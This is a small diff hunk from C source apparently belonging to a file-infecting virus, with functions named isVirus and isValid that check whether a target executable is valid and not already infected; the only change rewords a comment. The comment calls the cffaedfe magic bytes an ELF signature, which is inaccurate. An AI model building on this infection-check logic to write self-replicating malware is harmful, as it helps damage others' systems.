@@ -43,7 +43,7 @@ bool isVirus(char filename[]) {
 
 
 // checks if valid ELF exe and not already infected
-// if first 3 chars in file == cffaedfe then valid executable file
+// if first few chars in file == cffaedfe then valid executable file
 bool isValid(char filename[], char virus[]) {
     FILE *fp;
     char ch[5]; // create a buffer with enough size for cffaedf + null termination
